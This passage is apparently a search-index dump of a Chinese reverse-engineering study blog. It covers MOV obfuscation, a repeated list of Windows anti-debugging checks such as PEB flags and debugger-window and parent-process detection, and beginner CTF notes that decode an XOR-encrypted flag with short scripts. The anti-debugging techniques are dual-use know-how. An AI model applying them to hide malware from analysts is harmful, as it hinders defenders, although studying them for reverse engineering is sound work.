","date":"2023-11-17","objectID":"/reverse-antidbg/:3:2","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#sms题目动态分析"},{"categories":["Reverse","notes"],"content":"\r四.MOV混淆 MOV这种混淆是怎样产生的呢？剑桥大学的Stephen Dolan证明了x86的mov指令可以完成几乎所有功能了（可能还需要jmp），其他指令都是“多余的”。受此启发，有个大牛做了一个虚拟机加密编译器。它是一个修改版的LCC编译器，输入是C语言代码，输出的obj里面直接包含了虚拟机加密后的代码。如它的名字，函数的所有代码只有mov指令，没有其他任何指令。这个加密编译器在网上是开源的项目。 https://github.com/xoreaxeaxeax/movfuscator 这种题目的特征就是：汇编代码的汇编指令几乎全部就是MOV 这种情况，我们几乎无法直接审计汇编代码 这道题没用啥特殊技巧，通过不断观察后发现，r2后的字符拼接起来或许就是flag字符串 我们进行全局搜索R2,得到flag 总结一下： 1.注意字符串的全局搜索 2.MOV并不混淆函数逻辑 3.大多数汇编代码可以猜测 ","date":"2023-11-17","objectID":"/reverse-antidbg/:4:0","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#四mov混淆"},{"categories":["Reverse","notes"],"content":"\r附按调试函数 0x1 IsDebuggerPresent函数​ 只能用于自身进程的检测，通过查询进程环境块(PEB)中的IsDubugged标志，如果处在被调试状态则返回非0，没有调试状态返回0 0x2 NeQueryInformationProcess函数​ 用于提取一个给定进程的信息，函数参数1表示进程句柄，参数2表示信息类型，第二个参数ProcessDebugPort的值如果设置为0x7，就可以进行返回句柄标识的进程是否被调试，如果处于调试状态，那么就会返回调试的端口，非调试状态则返回0 0x3 CheckRemoteDebuggerPresent函数​ 它可以用与自身进程和其他进程，通过查询进程环境块(PEB)中的IsDebugged标志，如果被调试状态，返回值返回非0，没调试状态返回0 0x4 FindWindowA、EnumWindows​ 通过检测运行环境的调试器的窗口信息 0x5 OutputDebug String​ 调试器调试应用程序的时候是通过触发异常方式进行调试功能的，通过利用SetLastError获取到的错误码是前面用SetLastError的错误码一致，如果没有被调试，那么错误码可能是任意值 0x6 注册表检测​ 通过查找调试器引用的注册表信息进行判断，如果当前环境下的注册表存在调试器的信息，则应用程序就可能确定它正在被调试 0x7 BeginDebugged标志检测​ 当应用程序运行的时候，fs:[30h]指向PEB地址，如果在指向的BeginDebugged标志位0的情况下，应用程序则没有被调试，反之则被调试。 0x8 检测ProcessHead标志​ 在PEB结构中的Reserved数组中有一个未公开的位置ProcessHeap，它位于PEB结构的0x18处，ProcessHead中包括ForceFlags标志，可以通过该标志进行判断是否处于被调试状态 0x9 检测NTGlobalFlag标志​ 通过调试器启动的进程和正常创建启动的进程有差别的，他们创建内存堆的方式也不一样。NTGlobaFlag标志它是微软未公开的，在PEB偏移0x68位置，如果值为0x70，那么表示程序是调试器启动的。 0x10 检测父进程是否是explorer.exe​ 正常启动的应用，其父进程是explorer.exe，如果进程被调试状态，那么其父进程就是调试器进程。所以只要其父进程不是explorer.exe进程就可以认定为调试状态。 ","date":"2023-11-17","objectID":"/reverse-antidbg/:5:0","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#附按调试函数"},{"categories":["Reverse","notes"],"content":"\r附按调试函数 0x1 IsDebuggerPresent函数​ 只能用于自身进程的检测，通过查询进程环境块(PEB)中的IsDubugged标志，如果处在被调试状态则返回非0，没有调试状态返回0 0x2 NeQueryInformationProcess函数​ 用于提取一个给定进程的信息，函数参数1表示进程句柄，参数2表示信息类型，第二个参数ProcessDebugPort的值如果设置为0x7，就可以进行返回句柄标识的进程是否被调试，如果处于调试状态，那么就会返回调试的端口，非调试状态则返回0 0x3 CheckRemoteDebuggerPresent函数​ 它可以用与自身进程和其他进程，通过查询进程环境块(PEB)中的IsDebugged标志，如果被调试状态，返回值返回非0，没调试状态返回0 0x4 FindWindowA、EnumWindows​ 通过检测运行环境的调试器的窗口信息 0x5 OutputDebug String​ 调试器调试应用程序的时候是通过触发异常方式进行调试功能的，通过利用SetLastError获取到的错误码是前面用SetLastError的错误码一致，如果没有被调试，那么错误码可能是任意值 0x6 注册表检测​ 通过查找调试器引用的注册表信息进行判断，如果当前环境下的注册表存在调试器的信息，则应用程序就可能确定它正在被调试 0x7 BeginDebugged标志检测​ 当应用程序运行的时候，fs:[30h]指向PEB地址，如果在指向的BeginDebugged标志位0的情况下，应用程序则没有被调试，反之则被调试。 0x8 检测ProcessHead标志​ 在PEB结构中的Reserved数组中有一个未公开的位置ProcessHeap，它位于PEB结构的0x18处，ProcessHead中包括ForceFlags标志，可以通过该标志进行判断是否处于被调试状态 0x9 检测NTGlobalFlag标志​ 通过调试器启动的进程和正常创建启动的进程有差别的，他们创建内存堆的方式也不一样。NTGlobaFlag标志它是微软未公开的，在PEB偏移0x68位置，如果值为0x70，那么表示程序是调试器启动的。 0x10 检测父进程是否是explorer.exe​ 正常启动的应用，其父进程是explorer.exe，如果进程被调试状态，那么其父进程就是调试器进程。所以只要其父进程不是explorer.exe进程就可以认定为调试状态。 ","date":"2023-11-17","objectID":"/reverse-antidbg/:5:0","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#0x1-isdebuggerpresent函数"},{"categories":["Reverse","notes"],"content":"\r附按调试函数 0x1 IsDebuggerPresent函数​ 只能用于自身进程的检测，通过查询进程环境块(PEB)中的IsDubugged标志，如果处在被调试状态则返回非0，没有调试状态返回0 0x2 NeQueryInformationProcess函数​ 用于提取一个给定进程的信息，函数参数1表示进程句柄，参数2表示信息类型，第二个参数ProcessDebugPort的值如果设置为0x7，就可以进行返回句柄标识的进程是否被调试，如果处于调试状态，那么就会返回调试的端口，非调试状态则返回0 0x3 CheckRemoteDebuggerPresent函数​ 它可以用与自身进程和其他进程，通过查询进程环境块(PEB)中的IsDebugged标志，如果被调试状态，返回值返回非0，没调试状态返回0 0x4 FindWindowA、EnumWindows​ 通过检测运行环境的调试器的窗口信息 0x5 OutputDebug String​ 调试器调试应用程序的时候是通过触发异常方式进行调试功能的，通过利用SetLastError获取到的错误码是前面用SetLastError的错误码一致，如果没有被调试，那么错误码可能是任意值 0x6 注册表检测​ 通过查找调试器引用的注册表信息进行判断，如果当前环境下的注册表存在调试器的信息，则应用程序就可能确定它正在被调试 0x7 BeginDebugged标志检测​ 当应用程序运行的时候，fs:[30h]指向PEB地址，如果在指向的BeginDebugged标志位0的情况下，应用程序则没有被调试，反之则被调试。 0x8 检测ProcessHead标志​ 在PEB结构中的Reserved数组中有一个未公开的位置ProcessHeap，它位于PEB结构的0x18处，ProcessHead中包括ForceFlags标志，可以通过该标志进行判断是否处于被调试状态 0x9 检测NTGlobalFlag标志​ 通过调试器启动的进程和正常创建启动的进程有差别的，他们创建内存堆的方式也不一样。NTGlobaFlag标志它是微软未公开的，在PEB偏移0x68位置，如果值为0x70，那么表示程序是调试器启动的。 0x10 检测父进程是否是explorer.exe​ 正常启动的应用，其父进程是explorer.exe，如果进程被调试状态，那么其父进程就是调试器进程。所以只要其父进程不是explorer.exe进程就可以认定为调试状态。 ","date":"2023-11-17","objectID":"/reverse-antidbg/:5:0","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#0x2-nequeryinformationprocess函数"},{"categories":["Reverse","notes"],"content":"\r附按调试函数 0x1 IsDebuggerPresent函数​ 只能用于自身进程的检测，通过查询进程环境块(PEB)中的IsDubugged标志，如果处在被调试状态则返回非0，没有调试状态返回0 0x2 NeQueryInformationProcess函数​ 用于提取一个给定进程的信息，函数参数1表示进程句柄，参数2表示信息类型，第二个参数ProcessDebugPort的值如果设置为0x7，就可以进行返回句柄标识的进程是否被调试，如果处于调试状态，那么就会返回调试的端口，非调试状态则返回0 0x3 CheckRemoteDebuggerPresent函数​ 它可以用与自身进程和其他进程，通过查询进程环境块(PEB)中的IsDebugged标志，如果被调试状态，返回值返回非0，没调试状态返回0 0x4 FindWindowA、EnumWindows​ 通过检测运行环境的调试器的窗口信息 0x5 OutputDebug String​ 调试器调试应用程序的时候是通过触发异常方式进行调试功能的，通过利用SetLastError获取到的错误码是前面用SetLastError的错误码一致，如果没有被调试，那么错误码可能是任意值 0x6 注册表检测​ 通过查找调试器引用的注册表信息进行判断，如果当前环境下的注册表存在调试器的信息，则应用程序就可能确定它正在被调试 0x7 BeginDebugged标志检测​ 当应用程序运行的时候，fs:[30h]指向PEB地址，如果在指向的BeginDebugged标志位0的情况下，应用程序则没有被调试，反之则被调试。 0x8 检测ProcessHead标志​ 在PEB结构中的Reserved数组中有一个未公开的位置ProcessHeap，它位于PEB结构的0x18处，ProcessHead中包括ForceFlags标志，可以通过该标志进行判断是否处于被调试状态 0x9 检测NTGlobalFlag标志​ 通过调试器启动的进程和正常创建启动的进程有差别的，他们创建内存堆的方式也不一样。NTGlobaFlag标志它是微软未公开的，在PEB偏移0x68位置，如果值为0x70，那么表示程序是调试器启动的。 0x10 检测父进程是否是explorer.exe​ 正常启动的应用，其父进程是explorer.exe，如果进程被调试状态，那么其父进程就是调试器进程。所以只要其父进程不是explorer.exe进程就可以认定为调试状态。 ","date":"2023-11-17","objectID":"/reverse-antidbg/:5:0","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#0x3-checkremotedebuggerpresent函数"},{"categories":["Reverse","notes"],"content":"\r附按调试函数 0x1 IsDebuggerPresent函数​ 只能用于自身进程的检测，通过查询进程环境块(PEB)中的IsDubugged标志，如果处在被调试状态则返回非0，没有调试状态返回0 0x2 NeQueryInformationProcess函数​ 用于提取一个给定进程的信息，函数参数1表示进程句柄，参数2表示信息类型，第二个参数ProcessDebugPort的值如果设置为0x7，就可以进行返回句柄标识的进程是否被调试，如果处于调试状态，那么就会返回调试的端口，非调试状态则返回0 0x3 CheckRemoteDebuggerPresent函数​ 它可以用与自身进程和其他进程，通过查询进程环境块(PEB)中的IsDebugged标志，如果被调试状态，返回值返回非0，没调试状态返回0 0x4 FindWindowA、EnumWindows​ 通过检测运行环境的调试器的窗口信息 0x5 OutputDebug String​ 调试器调试应用程序的时候是通过触发异常方式进行调试功能的，通过利用SetLastError获取到的错误码是前面用SetLastError的错误码一致，如果没有被调试，那么错误码可能是任意值 0x6 注册表检测​ 通过查找调试器引用的注册表信息进行判断，如果当前环境下的注册表存在调试器的信息，则应用程序就可能确定它正在被调试 0x7 BeginDebugged标志检测​ 当应用程序运行的时候，fs:[30h]指向PEB地址，如果在指向的BeginDebugged标志位0的情况下，应用程序则没有被调试，反之则被调试。 0x8 检测ProcessHead标志​ 在PEB结构中的Reserved数组中有一个未公开的位置ProcessHeap，它位于PEB结构的0x18处，ProcessHead中包括ForceFlags标志，可以通过该标志进行判断是否处于被调试状态 0x9 检测NTGlobalFlag标志​ 通过调试器启动的进程和正常创建启动的进程有差别的，他们创建内存堆的方式也不一样。NTGlobaFlag标志它是微软未公开的，在PEB偏移0x68位置，如果值为0x70，那么表示程序是调试器启动的。 0x10 检测父进程是否是explorer.exe​ 正常启动的应用，其父进程是explorer.exe，如果进程被调试状态，那么其父进程就是调试器进程。所以只要其父进程不是explorer.exe进程就可以认定为调试状态。 ","date":"2023-11-17","objectID":"/reverse-antidbg/:5:0","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#0x4-findwindowaenumwindows"},{"categories":["Reverse","notes"],"content":"\r附按调试函数 0x1 IsDebuggerPresent函数​ 只能用于自身进程的检测，通过查询进程环境块(PEB)中的IsDubugged标志，如果处在被调试状态则返回非0，没有调试状态返回0 0x2 NeQueryInformationProcess函数​ 用于提取一个给定进程的信息，函数参数1表示进程句柄，参数2表示信息类型，第二个参数ProcessDebugPort的值如果设置为0x7，就可以进行返回句柄标识的进程是否被调试，如果处于调试状态，那么就会返回调试的端口，非调试状态则返回0 0x3 CheckRemoteDebuggerPresent函数​ 它可以用与自身进程和其他进程，通过查询进程环境块(PEB)中的IsDebugged标志，如果被调试状态，返回值返回非0，没调试状态返回0 0x4 FindWindowA、EnumWindows​ 通过检测运行环境的调试器的窗口信息 0x5 OutputDebug String​ 调试器调试应用程序的时候是通过触发异常方式进行调试功能的，通过利用SetLastError获取到的错误码是前面用SetLastError的错误码一致，如果没有被调试，那么错误码可能是任意值 0x6 注册表检测​ 通过查找调试器引用的注册表信息进行判断，如果当前环境下的注册表存在调试器的信息，则应用程序就可能确定它正在被调试 0x7 BeginDebugged标志检测​ 当应用程序运行的时候，fs:[30h]指向PEB地址，如果在指向的BeginDebugged标志位0的情况下，应用程序则没有被调试，反之则被调试。 0x8 检测ProcessHead标志​ 在PEB结构中的Reserved数组中有一个未公开的位置ProcessHeap，它位于PEB结构的0x18处，ProcessHead中包括ForceFlags标志，可以通过该标志进行判断是否处于被调试状态 0x9 检测NTGlobalFlag标志​ 通过调试器启动的进程和正常创建启动的进程有差别的，他们创建内存堆的方式也不一样。NTGlobaFlag标志它是微软未公开的，在PEB偏移0x68位置，如果值为0x70，那么表示程序是调试器启动的。 0x10 检测父进程是否是explorer.exe​ 正常启动的应用，其父进程是explorer.exe，如果进程被调试状态，那么其父进程就是调试器进程。所以只要其父进程不是explorer.exe进程就可以认定为调试状态。 ","date":"2023-11-17","objectID":"/reverse-antidbg/:5:0","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#0x5-outputdebug-string"},{"categories":["Reverse","notes"],"content":"\r附按调试函数 0x1 IsDebuggerPresent函数​ 只能用于自身进程的检测，通过查询进程环境块(PEB)中的IsDubugged标志，如果处在被调试状态则返回非0，没有调试状态返回0 0x2 NeQueryInformationProcess函数​ 用于提取一个给定进程的信息，函数参数1表示进程句柄，参数2表示信息类型，第二个参数ProcessDebugPort的值如果设置为0x7，就可以进行返回句柄标识的进程是否被调试，如果处于调试状态，那么就会返回调试的端口，非调试状态则返回0 0x3 CheckRemoteDebuggerPresent函数​ 它可以用与自身进程和其他进程，通过查询进程环境块(PEB)中的IsDebugged标志，如果被调试状态，返回值返回非0，没调试状态返回0 0x4 FindWindowA、EnumWindows​ 通过检测运行环境的调试器的窗口信息 0x5 OutputDebug String​ 调试器调试应用程序的时候是通过触发异常方式进行调试功能的，通过利用SetLastError获取到的错误码是前面用SetLastError的错误码一致，如果没有被调试，那么错误码可能是任意值 0x6 注册表检测​ 通过查找调试器引用的注册表信息进行判断，如果当前环境下的注册表存在调试器的信息，则应用程序就可能确定它正在被调试 0x7 BeginDebugged标志检测​ 当应用程序运行的时候，fs:[30h]指向PEB地址，如果在指向的BeginDebugged标志位0的情况下，应用程序则没有被调试，反之则被调试。 0x8 检测ProcessHead标志​ 在PEB结构中的Reserved数组中有一个未公开的位置ProcessHeap，它位于PEB结构的0x18处，ProcessHead中包括ForceFlags标志，可以通过该标志进行判断是否处于被调试状态 0x9 检测NTGlobalFlag标志​ 通过调试器启动的进程和正常创建启动的进程有差别的，他们创建内存堆的方式也不一样。NTGlobaFlag标志它是微软未公开的，在PEB偏移0x68位置，如果值为0x70，那么表示程序是调试器启动的。 0x10 检测父进程是否是explorer.exe​ 正常启动的应用，其父进程是explorer.exe，如果进程被调试状态，那么其父进程就是调试器进程。所以只要其父进程不是explorer.exe进程就可以认定为调试状态。 ","date":"2023-11-17","objectID":"/reverse-antidbg/:5:0","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#0x6-注册表检测"},{"categories":["Reverse","notes"],"content":"\r附按调试函数 0x1 IsDebuggerPresent函数​ 只能用于自身进程的检测，通过查询进程环境块(PEB)中的IsDubugged标志，如果处在被调试状态则返回非0，没有调试状态返回0 0x2 NeQueryInformationProcess函数​ 用于提取一个给定进程的信息，函数参数1表示进程句柄，参数2表示信息类型，第二个参数ProcessDebugPort的值如果设置为0x7，就可以进行返回句柄标识的进程是否被调试，如果处于调试状态，那么就会返回调试的端口，非调试状态则返回0 0x3 CheckRemoteDebuggerPresent函数​ 它可以用与自身进程和其他进程，通过查询进程环境块(PEB)中的IsDebugged标志，如果被调试状态，返回值返回非0，没调试状态返回0 0x4 FindWindowA、EnumWindows​ 通过检测运行环境的调试器的窗口信息 0x5 OutputDebug String​ 调试器调试应用程序的时候是通过触发异常方式进行调试功能的，通过利用SetLastError获取到的错误码是前面用SetLastError的错误码一致，如果没有被调试，那么错误码可能是任意值 0x6 注册表检测​ 通过查找调试器引用的注册表信息进行判断，如果当前环境下的注册表存在调试器的信息，则应用程序就可能确定它正在被调试 0x7 BeginDebugged标志检测​ 当应用程序运行的时候，fs:[30h]指向PEB地址，如果在指向的BeginDebugged标志位0的情况下，应用程序则没有被调试，反之则被调试。 0x8 检测ProcessHead标志​ 在PEB结构中的Reserved数组中有一个未公开的位置ProcessHeap，它位于PEB结构的0x18处，ProcessHead中包括ForceFlags标志，可以通过该标志进行判断是否处于被调试状态 0x9 检测NTGlobalFlag标志​ 通过调试器启动的进程和正常创建启动的进程有差别的，他们创建内存堆的方式也不一样。NTGlobaFlag标志它是微软未公开的，在PEB偏移0x68位置，如果值为0x70，那么表示程序是调试器启动的。 0x10 检测父进程是否是explorer.exe​ 正常启动的应用，其父进程是explorer.exe，如果进程被调试状态，那么其父进程就是调试器进程。所以只要其父进程不是explorer.exe进程就可以认定为调试状态。 ","date":"2023-11-17","objectID":"/reverse-antidbg/:5:0","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#0x7-begindebugged标志检测"},{"categories":["Reverse","notes"],"content":"\r附按调试函数 0x1 IsDebuggerPresent函数​ 只能用于自身进程的检测，通过查询进程环境块(PEB)中的IsDubugged标志，如果处在被调试状态则返回非0，没有调试状态返回0 0x2 NeQueryInformationProcess函数​ 用于提取一个给定进程的信息，函数参数1表示进程句柄，参数2表示信息类型，第二个参数ProcessDebugPort的值如果设置为0x7，就可以进行返回句柄标识的进程是否被调试，如果处于调试状态，那么就会返回调试的端口，非调试状态则返回0 0x3 CheckRemoteDebuggerPresent函数​ 它可以用与自身进程和其他进程，通过查询进程环境块(PEB)中的IsDebugged标志，如果被调试状态，返回值返回非0，没调试状态返回0 0x4 FindWindowA、EnumWindows​ 通过检测运行环境的调试器的窗口信息 0x5 OutputDebug String​ 调试器调试应用程序的时候是通过触发异常方式进行调试功能的，通过利用SetLastError获取到的错误码是前面用SetLastError的错误码一致，如果没有被调试，那么错误码可能是任意值 0x6 注册表检测​ 通过查找调试器引用的注册表信息进行判断，如果当前环境下的注册表存在调试器的信息，则应用程序就可能确定它正在被调试 0x7 BeginDebugged标志检测​ 当应用程序运行的时候，fs:[30h]指向PEB地址，如果在指向的BeginDebugged标志位0的情况下，应用程序则没有被调试，反之则被调试。 0x8 检测ProcessHead标志​ 在PEB结构中的Reserved数组中有一个未公开的位置ProcessHeap，它位于PEB结构的0x18处，ProcessHead中包括ForceFlags标志，可以通过该标志进行判断是否处于被调试状态 0x9 检测NTGlobalFlag标志​ 通过调试器启动的进程和正常创建启动的进程有差别的，他们创建内存堆的方式也不一样。NTGlobaFlag标志它是微软未公开的，在PEB偏移0x68位置，如果值为0x70，那么表示程序是调试器启动的。 0x10 检测父进程是否是explorer.exe​ 正常启动的应用，其父进程是explorer.exe，如果进程被调试状态，那么其父进程就是调试器进程。所以只要其父进程不是explorer.exe进程就可以认定为调试状态。 ","date":"2023-11-17","objectID":"/reverse-antidbg/:5:0","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#0x8-检测processhead标志"},{"categories":["Reverse","notes"],"content":"\r附按调试函数 0x1 IsDebuggerPresent函数​ 只能用于自身进程的检测，通过查询进程环境块(PEB)中的IsDubugged标志，如果处在被调试状态则返回非0，没有调试状态返回0 0x2 NeQueryInformationProcess函数​ 用于提取一个给定进程的信息，函数参数1表示进程句柄，参数2表示信息类型，第二个参数ProcessDebugPort的值如果设置为0x7，就可以进行返回句柄标识的进程是否被调试，如果处于调试状态，那么就会返回调试的端口，非调试状态则返回0 0x3 CheckRemoteDebuggerPresent函数​ 它可以用与自身进程和其他进程，通过查询进程环境块(PEB)中的IsDebugged标志，如果被调试状态，返回值返回非0，没调试状态返回0 0x4 FindWindowA、EnumWindows​ 通过检测运行环境的调试器的窗口信息 0x5 OutputDebug String​ 调试器调试应用程序的时候是通过触发异常方式进行调试功能的，通过利用SetLastError获取到的错误码是前面用SetLastError的错误码一致，如果没有被调试，那么错误码可能是任意值 0x6 注册表检测​ 通过查找调试器引用的注册表信息进行判断，如果当前环境下的注册表存在调试器的信息，则应用程序就可能确定它正在被调试 0x7 BeginDebugged标志检测​ 当应用程序运行的时候，fs:[30h]指向PEB地址，如果在指向的BeginDebugged标志位0的情况下，应用程序则没有被调试，反之则被调试。 0x8 检测ProcessHead标志​ 在PEB结构中的Reserved数组中有一个未公开的位置ProcessHeap，它位于PEB结构的0x18处，ProcessHead中包括ForceFlags标志，可以通过该标志进行判断是否处于被调试状态 0x9 检测NTGlobalFlag标志​ 通过调试器启动的进程和正常创建启动的进程有差别的，他们创建内存堆的方式也不一样。NTGlobaFlag标志它是微软未公开的，在PEB偏移0x68位置，如果值为0x70，那么表示程序是调试器启动的。 0x10 检测父进程是否是explorer.exe​ 正常启动的应用，其父进程是explorer.exe，如果进程被调试状态，那么其父进程就是调试器进程。所以只要其父进程不是explorer.exe进程就可以认定为调试状态。 ","date":"2023-11-17","objectID":"/reverse-antidbg/:5:0","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#0x9-检测ntglobalflag标志"},{"categories":["Reverse","notes"],"content":"\r附按调试函数 0x1 IsDebuggerPresent函数​ 只能用于自身进程的检测，通过查询进程环境块(PEB)中的IsDubugged标志，如果处在被调试状态则返回非0，没有调试状态返回0 0x2 NeQueryInformationProcess函数​ 用于提取一个给定进程的信息，函数参数1表示进程句柄，参数2表示信息类型，第二个参数ProcessDebugPort的值如果设置为0x7，就可以进行返回句柄标识的进程是否被调试，如果处于调试状态，那么就会返回调试的端口，非调试状态则返回0 0x3 CheckRemoteDebuggerPresent函数​ 它可以用与自身进程和其他进程，通过查询进程环境块(PEB)中的IsDebugged标志，如果被调试状态，返回值返回非0，没调试状态返回0 0x4 FindWindowA、EnumWindows​ 通过检测运行环境的调试器的窗口信息 0x5 OutputDebug String​ 调试器调试应用程序的时候是通过触发异常方式进行调试功能的，通过利用SetLastError获取到的错误码是前面用SetLastError的错误码一致，如果没有被调试，那么错误码可能是任意值 0x6 注册表检测​ 通过查找调试器引用的注册表信息进行判断，如果当前环境下的注册表存在调试器的信息，则应用程序就可能确定它正在被调试 0x7 BeginDebugged标志检测​ 当应用程序运行的时候，fs:[30h]指向PEB地址，如果在指向的BeginDebugged标志位0的情况下，应用程序则没有被调试，反之则被调试。 0x8 检测ProcessHead标志​ 在PEB结构中的Reserved数组中有一个未公开的位置ProcessHeap，它位于PEB结构的0x18处，ProcessHead中包括ForceFlags标志，可以通过该标志进行判断是否处于被调试状态 0x9 检测NTGlobalFlag标志​ 通过调试器启动的进程和正常创建启动的进程有差别的，他们创建内存堆的方式也不一样。NTGlobaFlag标志它是微软未公开的，在PEB偏移0x68位置，如果值为0x70，那么表示程序是调试器启动的。 0x10 检测父进程是否是explorer.exe​ 正常启动的应用，其父进程是explorer.exe，如果进程被调试状态，那么其父进程就是调试器进程。所以只要其父进程不是explorer.exe进程就可以认定为调试状态。 ","date":"2023-11-17","objectID":"/reverse-antidbg/:5:0","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#0x10-检测父进程是否是explorerexe"},{"categories":["Reverse","notes"],"content":"reverse基础1 操作码（opcode）也就是机器指令 C语言编译流程： C语言代码--\u003e汇编语言--\u003e机器代码 ","date":"2023-11-17","objectID":"/reverse-basis1/:0:0","series":null,"tags":["Reverse","notes"],"title":"Reverse-Basis1","uri":"/reverse-basis1/#"},{"categories":["Reverse","notes"],"content":"\r0x01IDA定位main函数打开字符串表，进行字符串搜索来定位，随后通过交叉引用列表定位到引用了该字符串的代码 定位之后对符号重新命名 strcmp用来进行字符串比较，若相同的话，返回0，若进行取反，即!strcmp则字符串相同返回1 ","date":"2023-11-17","objectID":"/reverse-basis1/:0:1","series":null,"tags":["Reverse","notes"],"title":"Reverse-Basis1","uri":"/reverse-basis1/#0x01ida定位main函数"},{"categories":["Reverse","notes"],"content":"\r0x02简单的加密算法举一个简单的小栗子 根据加密逻辑进行一个逆运算 再来看一个简单的小栗子 异或异或（xor）是一个数学运算符。它应用于逻辑运算。异或的数学符号为“⊕”，计算机符号为“xor”。 异或也叫半加运算，其运算法则相当于不带进位的二进制加法： 二进制下用1表示真，0表示假，则异或的运算法则为：0⊕0=0，1⊕0=1，0⊕1=1，1⊕1=0（同为0，异为1）， 关键理解：不进位的二进制算法 明文^密钥=密文 密文^密钥=明文 拿到T3拉进IDA，按照之前所学，定位main函数，反编译之后修改函数名 int __cdecl main_0(int argc, const char **argv, const char **envp) { size_t i; // [esp+D0h] [ebp-114h] char Str1[260]; // [esp+DCh] [ebp-108h] BYREF printf(\"[5] Hi CTFer,Input your flag:\"); scanf(\"%s\", Str1); for ( i = 0; i \u003c j__strlen(Str1); ++i ) Str1[i] ^= i; if ( !j__strcmp(Str1, Str2) ) printf(\"you are right!\\n\"); else printf(\"you are wrong!\\n\"); return 0; } 进行代码审计，其加密操作为 for ( i = 0; i \u003c j__strlen(Str1); ++i ) Str1[i] ^= i; 根据异或运算原理，我们将密文再进行一次异或运算即可得到明文，从IDA中提取密文，使用LazyIDA进行数据提取 得到数据为(字节数组) [0x66, 0x6D, 0x63, 0x64, 0x7F, 0x5C, 0x49, 0x52, 0x57, 0x4F, 0x43, 0x45, 0x48, 0x52, 0x47, 0x5B, 0x4F, 0x59, 0x53, 0x5B, 0x55, 0x68, 0x00] 写一个python脚本进行异或操作 data = [0x66, 0x6D, 0x63, 0x64, 0x7F, 0x5C, 0x49, 0x52, 0x57, 0x4F, 0x43, 0x45, 0x48, 0x52, 0x47, 0x5B, 0x4F, 0x59, 0x53, 0x5B, 0x55, 0x68, 0x00] for i in range(len(data)): data[i] ^= i print (chr(data[i]),end =\"\") 得到flag 当然，我们也可以根据修改后的IDA伪代码，编写C语言脚本来实现逆向计算 #include \u003cstdio.h\u003e #include \u003cstring.h\u003e int main() { char Str1[] = { 0x66,0x6D,0x63,0x64,0x7F,0x5C,0x49,0x52,0x57,0x4F,0x43,0x45,0x48,0x52,0x47,0x5B,0x4F,0x59,0x53,0x5B,0x55,0x68,0x00 }; for (int i = 0; i \u003c strlen(Str1); ++i) { Str1[i] ^= i; } printf(\"%s\", Str1); return 0; } strlen()要加#include \u003cstring.h\u003e函数头 总结一下，逆向，就是对代码执行流程进行正向分析，然后通过脚本进行逆向计算 ","date":"2023-11-17","objectID":"/reverse-basis1/:0:2","series":null,"tags":["Reverse","notes"],"title":"Reverse-Basis1","uri":"/reverse-basis1/#0x02简单的加密算法"},{"categories":["Reverse","notes"],"content":"\r0x02简单的加密算法举一个简单的小栗子 根据加密逻辑进行一个逆运算 再来看一个简单的小栗子 异或异或（xor）是一个数学运算符。它应用于逻辑运算。异或的数学符号为“⊕”，计算机符号为“xor”。 异或也叫半加运算，其运算法则相当于不带进位的二进制加法： 二进制下用1表示真，0表示假，则异或的运算法则为：0⊕0=0，1⊕0=1，0⊕1=1，1⊕1=0（同为0，异为1）， 关键理解：不进位的二进制算法 明文^密钥=密文 密文^密钥=明文 拿到T3拉进IDA，按照之前所学，定位main函数，反编译之后修改函数名 int __cdecl main_0(int argc, const char **argv, const char **envp) { size_t i; // [esp+D0h] [ebp-114h] char Str1[260]; // [esp+DCh] [ebp-108h] BYREF printf(\"[5] Hi CTFer,Input your flag:\"); scanf(\"%s\", Str1); for ( i = 0; i \u003c j__strlen(Str1); ++i ) Str1[i] ^= i; if ( !j__strcmp(Str1, Str2) ) printf(\"you are right!\\n\"); else printf(\"you are wrong!\\n\"); return 0; } 进行代码审计，其加密操作为 for ( i = 0; i \u003c j__strlen(Str1); ++i ) Str1[i] ^= i; 根据异或运算原理，我们将密文再进行一次异或运算即可得到明文，从IDA中提取密文，使用LazyIDA进行数据提取 得到数据为(字节数组) [0x66, 0x6D, 0x63, 0x64, 0x7F, 0x5C, 0x49, 0x52, 0x57, 0x4F, 0x43, 0x45, 0x48, 0x52, 0x47, 0x5B, 0x4F, 0x59, 0x53, 0x5B, 0x55, 0x68, 0x00] 写一个python脚本进行异或操作 data = [0x66, 0x6D, 0x63, 0x64, 0x7F, 0x5C, 0x49, 0x52, 0x57, 0x4F, 0x43, 0x45, 0x48, 0x52, 0x47, 0x5B, 0x4F, 0x59, 0x53, 0x5B, 0x55, 0x68, 0x00] for i in range(len(data)): data[i] ^= i print (chr(data[i]),end =\"\") 得到flag 当然，我们也可以根据修改后的IDA伪代码，编写C语言脚本来实现逆向计算 #include #include int main() { char Str1[] = { 0x66,0x6D,0x63,0x64,0x7F,0x5C,0x49,0x52,0x57,0x4F,0x43,0x45,0x48,0x52,0x47,0x5B,0x4F,0x59,0x53,0x5B,0x55,0x68,0x00 }; for (int i = 0; i \u003c strlen(Str1); ++i) { Str1[i] ^= i; } printf(\"%s\", Str1); return 0; } strlen()要加#include 函数头 总结一下，逆向，就是对代码执行流程进行正向分析，然后通过脚本进行逆向计算 ","date":"2023-11-17","objectID":"/reverse-basis1/:0:2","series":null,"tags":["Reverse","notes"],"title":"Reverse-Basis1","uri":"/reverse-basis1/#异或"},{"categories":["Reverse","notes"],"content":"\r0x03 Base64编码逆向T4这道题大体思路跟前面的一样，无非是加了一个Base64编码的函数 主要代码如下： printf((int)\"[4] Hi 